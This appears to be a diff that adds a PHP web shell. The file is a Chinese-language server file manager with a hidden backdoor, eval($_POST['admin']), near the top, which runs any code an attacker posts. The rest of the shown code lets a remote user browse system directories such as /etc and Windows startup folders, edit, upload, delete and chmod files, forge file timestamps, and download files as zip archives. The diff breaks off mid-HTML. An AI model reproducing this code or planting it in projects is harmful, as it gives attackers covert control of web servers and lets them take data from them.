@@ -1,0 +1,477 @@
+<?php
+error_reporting(E_ERROR);
+header("content-Type: text/html; charset=gb2312");
+set_time_limit(0);
+function Root_GP(&$array)
+{
+	while(list($key,$var) = each($array))
+	{
+		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
+		{
+			if(is_string($var)) $array[$key] = stripslashes($var);
+			if(is_array($var)) $array[$key] = Root_GP($var);  
+		}
+	}
+	return $array;
+}
+$password = "admin";  //
+eval($_POST[$password]);
+function Root_CSS()
+{
+print<<<END
+<style type="text/css">
+*{padding:0; margin:0;}
+body{background:threedface;font-family:"Verdana","Tahoma","宋体",sans-serif;font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
+a{color:#000000;text-decoration:none;}
+a:hover{background:#BBBBBB;}
+table{color:#000000;font-family:"Verdana","Tahoma","宋体",sans-serif;font-size:13px;border:1px solid #999999;}
+td{background:#F9F6F4;}
+.toptd{background:threedface;width:310px;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;}
+.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
+.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
+</style>\n
+END;
+return false;
+}
+//文件管理
+class packdir
+{
+	var $out='';
+	var $datasec=array();
+	var $ctrl_dir=array();
+	var $eof_ctrl_dir="\x50\x4b\x05\x06\x00\x00\x00\x00";
+	var $old_offset=0;
+function packdir($array)
+{
+	if(@function_exists('gzcompress'))
+	{
+		for($n = 0;$n < count($array);$n++)
+		{
+			$array[$n] = urldecode($array[$n]);
+			$fp = @fopen($array[$n], 'r');
+			$filecode = @fread($fp, @filesize($array[$n]));
+			@fclose($fp);
+			$this -> filezip($filecode,basename($array[$n]));
+		}
+	@closedir($zhizhen);
+	$this->out = $this->packfile();
+	return true;
+}
+return false;
+}
+function at($atunix = 0)
+{
+	$unixarr = ($atunix == 0) ? getdate() : getdate($atunix);
+	if ($unixarr['year'] < 1980)
+	{
+		$unixarr['year']    = 1980;
+		$unixarr['mon']     = 1;
+		$unixarr['mday']    = 1;
+		$unixarr['hours']   = 0;
+		$unixarr['minutes'] = 0;
+		$unixarr['seconds'] = 0;
+	} 
+	return (($unixarr['year'] - 1980) << 25) | ($unixarr['mon'] << 21) | ($unixarr['mday'] << 16) | ($unixarr['hours'] << 11) | ($unixarr['minutes'] << 5) | ($unixarr['seconds'] >> 1);
+}
+function filezip($data, $name, $time = 0)
+{
+	$name = str_replace('\\', '/', $name);
+	$dtime = dechex($this->at($time));
+	$hexdtime	= '\x'.$dtime[6].$dtime[7].'\x'.$dtime[4].$dtime[5].'\x'.$dtime[2].$dtime[3].'\x'.$dtime[0].$dtime[1];
+	eval('$hexdtime = "' . $hexdtime . '";');
+	$fr	= "\x50\x4b\x03\x04";
+	$fr	.= "\x14\x00";
+	$fr	.= "\x00\x00";
+	$fr	.= "\x08\x00";
+	$fr	.= $hexdtime;
+	$unc_len = strlen($data);
+	$crc = crc32($data);
+	$zdata = gzcompress($data);
+	$c_len = strlen($zdata);
+	$zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
+	$fr .= pack('V', $crc);
+	$fr .= pack('V', $c_len);
+	$fr .= pack('V', $unc_len);
+	$fr .= pack('v', strlen($name));
+	$fr .= pack('v', 0);
+	$fr .= $name;
+	$fr .= $zdata;
+	$fr .= pack('V', $crc);
+	$fr .= pack('V', $c_len);
+	$fr .= pack('V', $unc_len);
+	$this -> datasec[] = $fr;
+	$new_offset = strlen(implode('', $this->datasec));
+	$cdrec = "\x50\x4b\x01\x02";
+	$cdrec .= "\x00\x00";
+	$cdrec .= "\x14\x00";
+	$cdrec .= "\x00\x00";
+	$cdrec .= "\x08\x00";
+	$cdrec .= $hexdtime;
+	$cdrec .= pack('V', $crc);
+	$cdrec .= pack('V', $c_len);
+	$cdrec .= pack('V', $unc_len);
+	$cdrec .= pack('v', strlen($name) );
+	$cdrec .= pack('v', 0 );
+	$cdrec .= pack('v', 0 );
+	$cdrec .= pack('v', 0 );
+	$cdrec .= pack('v', 0 );
+	$cdrec .= pack('V', 32 );
+	$cdrec .= pack('V', $this -> old_offset );
+	$this -> old_offset = $new_offset;
+	$cdrec .= $name;
+	$this -> ctrl_dir[] = $cdrec;
+}
+
+function packfile()
+{
+	$data    = implode('', $this -> datasec);
+	$ctrldir = implode('', $this -> ctrl_dir);
+	return $data.$ctrldir.$this -> eof_ctrl_dir.pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).pack('V', strlen($ctrldir)).pack('V', strlen($data))."\x00\x00";
+}
+}
+function File_Str($string)
+{
+	return str_replace('//','/',str_replace('\\','/',$string));
+}
+function File_Size($size)
+{
+	if($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G';
+	elseif($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M';
+	elseif($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K';
+	else $size = $size . ' B';
+	return $size;
+}
+function File_Mode()
+{
+	$RealPath = realpath('./');
+	$SelfPath = $_SERVER['PHP_SELF'];
+	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
+	return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
+}
+function File_Read($filename)
+{
+	$handle = @fopen($filename,"rb");
+	$filecode = @fread($handle,@filesize($filename));
+	@fclose($handle);
+	return $filecode;
+}
+function File_Write($filename,$filecode,$filemode)
+{
+	$key = true;
+	$handle = @fopen($filename,$filemode);
+	if(!@fwrite($handle,$filecode))
+	{
+	@chmod($filename,0666);
+	$key = @fwrite($handle,$filecode) ? true : false;
+	}
+@fclose($handle);
+return $key;
+}
+function File_Up($filea,$fileb)
+{
+	$key = @copy($filea,$fileb) ? true : false;
+	if(!$key) $key = @move_uploaded_file($filea,$fileb) ? true : false;
+	return $key;
+}
+function File_Down($filename)
+{
+	if(!file_exists($filename)) return false;
+	$filedown = basename($filename);
+	$array = explode('.', $filedown);
+	$arrayend = array_pop($array);
+	header('Content-type: application/x-'.$arrayend);
+	header('Content-Disposition: attachment; filename='.$filedown);
+	header('Content-Length: '.filesize($filename));
+	@readfile($filename);
+	exit;
+}
+function File_Deltree($deldir)
+{
+	if(($mydir = @opendir($deldir)) == NULL) return false;	
+	while(false !== ($file = @readdir($mydir)))
+	{
+		$name = File_Str($deldir.'/'.$file);
+		if((is_dir($name)) && ($file!='.') && ($file!='..')){@chmod($name,0777);File_Deltree($name);}
+		if(is_file($name)){@chmod($name,0777);@unlink($name);}
+	} 
+	@closedir($mydir);
+	@chmod($deldir,0777);
+	return @rmdir($deldir) ? true : false;
+}
+function File_Act($array,$actall,$inver)
+{
+	if(($count = count($array)) == 0) return '请选择文件';
+	if($actall == 'e')
+	{
+		$zip = new packdir;
+		if($zip->packdir($array)){$spider = $zip->out;header("Content-type: application/unknown");header("Accept-Ranges: bytes");header("Content-length: ".strlen($spider));header("Content-disposition: attachment; filename=".$inver.";");echo $spider;exit;}
+		return '打包文件失败';
+	}
+	$i = 0;
+	while($i < $count)
+	{
+		$array[$i] = urldecode($array[$i]);
+		switch($actall)
+		{
+			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return '路径错误'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = '复制到'.$inver.'目录'; break;
+			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = '删除'; break;
+			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return '属性值错误'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = '属性修改为'.$inver; break;
+			case "d" : @touch($array[$i],strtotime($inver)); $msg = '修改时间为'.$inver; break;
+		}
+		$i++;
+	}
+	return '所选文件'.$msg.'完毕';
+}
+function File_Edit($filepath,$filename,$dim = '')
+{
+	$THIS_DIR = urlencode($filepath);
+	$THIS_FILE = File_Str($filepath.'/'.$filename);
+	if(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));}
+	else {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';}
+print<<<END
+<script language="javascript">
+var NS4 = (document.layers);
+var IE4 = (document.all);
+var win = this;
+var n = 0;
+function search(str){
+	var txt, i, found;
+	if(str == "")return false;
+	if(NS4){
+		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
+		if(n == 0) alert(str + " ... Not-Find")
+	}
+	if(IE4){
+		txt = win.document.body.createTextRange();
+		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
+			txt.moveStart("character", 1);
+			txt.moveEnd("textedit")
+		}
+		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
+		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
+	}
+	return false
+}
+function CheckDate(){
+	var re = document.getElementById('mtime').value;
+	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
+	var r = re.match(reg);
+	if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
+	else{document.getElementById('editor').submit();}
+}
+</script>
+<div class="actall">查找内容: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
+<input type="button" value="查找" onclick="search(searchs.value)"></div>
+<form method="POST" id="editor" action="?s=a&p={$THIS_DIR}">
+<div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
+<div class="actall"><textarea name="pfc" id style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
+<div class="actall">文件修改时间 <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
+<div class="actall"><input type="button" value="保存" onclick="CheckDate();" style="width:80px;">
+<input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
+</form>
+END;
+}
+function File_Soup($p)
+
+{
+
+	$THIS_DIR = urlencode($p);
+	$UP_SIZE = get_cfg_var('upload_max_filesize');
+	$MSG_BOX = '单个附件允许大小:'.$UP_SIZE.', 改名格式(new.php),如为空,则保持原文件名.';
+	if(!empty($_POST['updir']))
+	{
+		if(count($_FILES['soup']) >= 1)
+		{
+			$i = 0;
+			foreach ($_FILES['soup']['error'] as $key => $error)
+			{
+				if ($error == UPLOAD_ERR_OK)
+				{
+					$souptmp = $_FILES['soup']['tmp_name'][$key];
+					if(!empty($_POST['reup'][$i]))$soupname = $_POST['reup'][$i]; else $soupname = $_FILES['soup']['name'][$key];
+					$MSG[$i] = File_Up($souptmp,File_Str($_POST['updir'].'/'.$soupname)) ? $soupname.'上传成功' : $soupname.'上传失败';
+				}
+				$i++;
+			}
+		}
+		else
+		{
+			$MSG_BOX = '请选择文件';
+		}
+	}
+print<<<END
+<div class="msgbox">{$MSG_BOX}</div>
+<form method="POST" id="editor" action="?s=q&p={$THIS_DIR}" enctype="multipart/form-data">
+<div class="actall">上传到目录: <input type="text" name="updir" value="{$p}" style="width:531px;height:22px;"></div>
+<div class="actall">附件1 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[0] </div>
+<div class="actall">附件2 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[1] </div>
+<div class="actall">附件3 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[2] </div>
+<div class="actall">附件4 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[3] </div>
+<div class="actall">附件5 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[4] </div>
+<div class="actall">附件6 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[5] </div>
+<div class="actall">附件7 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[6] </div>
+<div class="actall">附件8 <input type="file" name="soup[]" style="width:300px;height:22px;"> 改名 <input type="text" name="reup[]" style="width:130px;height:22px;"> $MSG[7] </div>
+<div class="actall"><input type="submit" value="上传" style="width:80px;"> <input type="button" value="返回" onclick="window.location='?s=a&p={$THIS_DIR}';" style="width:80px;"></div>
+</form>
+END;
+}
+function File_a($p)
+{
+	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
+	$MSG_BOX = '等待消息队列';
+	$UP_DIR = urlencode(File_Str($p.'/..'));
+	$REAL_DIR = File_Str(realpath($p));
+	$FILE_DIR = File_Str(dirname(__FILE__));
+	$ROOT_DIR = File_Mode();
+	$THIS_DIR = urlencode(File_Str($REAL_DIR));
+	$NUM_D = 0;
+	$NUM_F = 0;
+	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? '编辑文件 '.$_POST['pfn'].' 成功' : '编辑文件 '.$_POST['pfn'].' 失败';@touch($_POST['pfn'],$intime);}
+	if(!empty($_FILES['ufp']['name'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($REAL_DIR.'/'.$upfilename)) ? '上传文件 '.$upfilename.' 成功' : '上传文件 '.$upfilename.' 失败';}
+	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
+	if(isset($_GET['md'])){$modfile = File_Str($REAL_DIR.'/'.$_GET['mk']); if(!eregi("^[0-7]{4}$",$_GET['md'])) $MSG_BOX = '属性值错误'; else $MSG_BOX = @chmod($modfile,base_convert($_GET['md'],8,10)) ? '修改 '.$modfile.' 属性为 '.$_GET['md'].' 成功' : '修改 '.$modfile.' 属性为 '.$_GET['md'].' 失败';}
+	if(isset($_GET['mn'])){$MSG_BOX = @rename(File_Str($REAL_DIR.'/'.$_GET['mn']),File_Str($REAL_DIR.'/'.$_GET['rn'])) ? '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 成功' : '改名 '.$_GET['mn'].' 为 '.$_GET['rn'].' 失败';}
+	if(isset($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($REAL_DIR.'/'.$_GET['dn']),0777) ? '创建目录 '.$_GET['dn'].' 成功' : '创建目录 '.$_GET['dn'].' 失败';}
+	if(isset($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? '删除目录 '.$_GET['dd'].' 成功' : '删除目录 '.$_GET['dd'].' 失败';}
+	if(isset($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = '下载文件不存在';}
+	Root_CSS();
+print<<<END
+<script type="text/javascript">
+	function Inputok(msg,gourl)
+	{
+		smsg = "当前文件:[" + msg + "]";
+		re = prompt(smsg,unescape(msg));
+		if(re)
+		{
+			var url = gourl + escape(re);
+			window.location = url;
+		}
+	}
+	function Delok(msg,gourl)
+	{
+		smsg = "确定要删除[" + unescape(msg) + "]吗?";
+		if(confirm(smsg))
+		{
+			if(gourl == 'b')
+			{
+				document.getElementById('actall').value = escape(gourl);
+				document.getElementById('fileall').submit();
+			}
+			else window.location = gourl;
+		}
+	}
+	function CheckDate(msg,gourl)
+	{
+		smsg = "当前文件时间:[" + msg + "]";
+		re = prompt(smsg,msg);
+		if(re)
+		{
+			var url = gourl + re;
+			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
+			var r = re.match(reg);
+			if(r==null){alert('日期格式不正确!格式:yyyy-mm-dd hh:mm:ss');return false;}
+			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
+		}
+	}
+	function CheckAll(form)
+	{
+		for(var i=0;i<form.elements.length;i++)
+		{
+			var e = form.elements[i];
+			if (e.name != 'chkall')
+			e.checked = form.chkall.checked;
+		}
+	}
+	function SubmitUrl(msg,txt,actid)
+	{
+		re = prompt(msg,unescape(txt));
+		if(re)
+		{
+			document.getElementById('actall').value = actid;
+			document.getElementById('inver').value = escape(re);
+			document.getElementById('fileall').submit();
+		}
+	}
+</script>
+<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
+<div class="actall" style="text-align:center;padding:3px;">
+<form method="GET"><input type="hidden" id="s" name="s" value="a">
+<input type="text" name="p" value="{$REAL_DIR}" style="width:550px;height:22px;">
+<select onchange="location.href='?s=a&p='+options[selectedIndex].value">
+	<option>---特殊目录---</option>
+	<option value="{$ROOT_DIR}">网站根目录</option>
+	<option value="{$FILE_DIR}">本程序目录</option>
+	<option value="C:/">C盘</option>
+	<option value="D:/">D盘</option>
+	<option value="E:/">E盘</option>
+	<option value="F:/">F盘</option>
+	<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动">启动项</option>
+	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup">启动项(英)</option>
+	<option value="C:/RECYCLER">回收站</option>
+	<option value="C:/Program Files">Programs</option>
+	<option value="/etc">etc</option>
+	<option value="/home">home</option>
+	<option value="/usr/local">Local</option>
+	<option value="/tmp">Temp</option>
+</select><input type="submit" value="转到" style="width:50px;"></form>
+<div style="margin-top:3px;"></div><form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
+	<input type="button" value="新建文件" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
+	<input type="button" value="新建目录" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
+	<input type="button" value="批量上传" onclick="window.location='?s=q&p={$REAL_DIR}';"> 
+	<input type="file" name="ufp" style="width:300px;height:22px;">
+	<input type="text" name="ufn" style="width:121px;height:22px;">
+	<input type="submit" value="上传" style="width:50px;">
+</form></div>
+<form method="POST" name="fileall" id="fileall" action="?s=a&p={$THIS_DIR}">
+<table border="0"><tr><td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>上级目录</b></a></td>
+<td class="toptd" style="width:80px;"> 操作 </td><td class="toptd" style="width:48px;"> 属性 </td><td class="toptd" style="width:173px;"> 修改时间 </td><td class="toptd" style="width:75px;"> 大小 </td></tr>
+END;
+	if(($h_d = @opendir($p)) == NULL) return false;
+	while(false !== ($Filename = @readdir($h_d)))
+	{
+		if($Filename == '.' or $Filename == '..') continue;
+		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
+		if(is_dir($Filepath))
+		{
+			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
+			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
+			$Filepath = urlencode($Filepath);
+			echo "\r\n".' <tr><td> <a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b> '.$Filename.' </b></a> </td> ';
+			$Filename = urlencode($Filename);
+			echo ' <td> <a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;"> 删除 </a> ';
+			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td> ';
+			echo ' <td> <a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;"> '.$Fileperm.' </a> </td> ';
+			echo ' <td>'.$Filetime.'</td> ';
+			echo ' <td> </td> </tr>'."\r\n";
+			$NUM_D++;
+		}
+	}
+
+	@rewinddir($h_d);
+	while(false !== ($Filename = @readdir($h_d)))
+	{
+		if($Filename == '.' or $Filename == '..') continue;
+		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
+		if(!is_dir($Filepath))
+		{
+			$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$Filepath);
+			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
+			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
+			$Filesize = File_Size(@filesize($Filepath));
+			if($Filepath == File_Str(__FILE__)) $fname = '<font color="#8B0000">'.$Filename.'</font>'; else $fname = $Filename;
+			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>';
+			$Filepath = urlencode($Filepath);
+			$Filename = urlencode($Filename);
+			echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> 编辑 </a> ';
+			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> 改名 </a> </td>';
+			echo ' <td>'.$Fileperm.'</td> ';
+			echo ' <td>'.$Filetime.'</td> ';
+			echo ' <td align="right"> <a href="?s=a&df='.$Filepath.'">'.$Filesize.'</a> </td></tr> '."\r\n";
+			$NUM_F++;
+		}
+	}
+	@closedir($h_d);
+	if(!$Filetime) $Filetime = '2009-01-01 00:00:00';
+print<<<END
+</table>
+<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined
